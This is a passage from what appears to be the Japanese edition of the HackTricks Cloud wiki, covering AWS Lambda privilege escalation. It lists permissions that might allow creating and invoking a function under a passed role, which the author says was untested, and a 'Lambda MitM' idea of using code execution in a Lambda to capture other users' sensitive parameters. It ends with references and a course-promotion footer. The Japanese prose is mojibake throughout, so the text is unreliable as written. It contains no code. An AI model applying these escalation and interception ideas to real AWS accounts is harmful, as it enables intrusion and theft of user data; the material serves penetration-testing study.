[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**æ½œåœ¨çš„ãªå½±éŸ¿ï¼š** ä½¿ç”¨ã•ã‚Œã‚‹lambdaã‚µãƒ¼ãƒ“ã‚¹ãƒ­ãƒ¼ãƒ«ã¸ã®ç›´æ¥çš„ãªæ¨©é™æ˜‡æ ¼ã€‚

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€é–¢æ•°ã‚’ä½œæˆã—ã€URLã‚’å‘¼ã³å‡ºã—ã¦å®Ÿè¡Œã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“... ã—ã‹ã—ã€ãƒ†ã‚¹ãƒˆã™ã‚‹æ–¹æ³•ã‚’è¦‹ã¤ã‘ã‚‰ã‚Œãªã‹ã£ãŸã®ã§ã€ã‚‚ã—è¦‹ã¤ã‘ãŸã‚‰æ•™ãˆã¦ãã ã•ã„ï¼

### Lambda MitM

ã„ãã¤ã‹ã®ãƒ©ãƒ ãƒ€ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼ã‹ã‚‰ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã§æ©Ÿå¯†æƒ…å ±ã‚’å—ã‘å–ã‚‹**ã“ã¨ã«ãªã‚Šã¾ã™ã€‚ã‚‚ã—ãã®ã†ã¡ã®1ã¤ã§RCEã‚’å–å¾—ã§ãã‚Œã°ã€ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒé€ä¿¡ã—ã¦ã„ã‚‹æƒ…å ±ã‚’æŠ½å‡ºã§ãã¾ã™ã€‚è©³ç´°ã¯ä»¥ä¸‹ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## å‚è€ƒæ–‡çŒ®

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
